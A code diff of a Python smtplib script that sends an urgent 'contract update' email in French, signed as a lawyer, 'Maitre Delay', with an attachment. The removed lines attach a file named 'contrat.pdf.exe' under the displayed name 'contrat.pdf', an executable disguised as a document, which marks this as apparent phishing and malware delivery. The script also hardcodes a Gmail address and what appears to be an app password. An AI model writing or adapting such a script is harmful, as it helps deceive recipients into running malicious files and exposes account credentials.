@@ -4,16 +4,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-# Config SMTP
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
-username = "anneviola8@gmail.com"
+username = "lilolo@gmail.com"
 password = "cmgi pzxk ukwi lmmi"
 
-# Création du message
 msg = MIMEMultipart()
 msg['From'] = username
-msg['To'] = "B.anneflore@yahoo.fr"
+msg['To'] = "liluijh@yahoo.com"
 msg['Subject'] = "Urgent : mise à jour de contrat"
 
 body = """
@@ -28,8 +26,7 @@ Maitre Delay.
 """
 msg.attach(MIMEText(body, 'plain'))
 
-# Ajout de la pièce jointe
-attachment_path = "dist/contrat.pdf.exe"
+attachment_path = "dist/contrat.pdf"
 attachment = MIMEBase('application', 'octet-stream')
 with open(attachment_path, 'rb') as f:
     attachment.set_payload(f.read())
@@ -37,7 +34,6 @@ encoders.encode_base64(attachment)
 attachment.add_header('Content-Disposition', 'attachment; filename="contrat.pdf"')
 msg.attach(attachment)
 
-# Envoi du mail
 try:
     server = smtplib.SMTP(smtp_server, smtp_port)
     server.starttls()
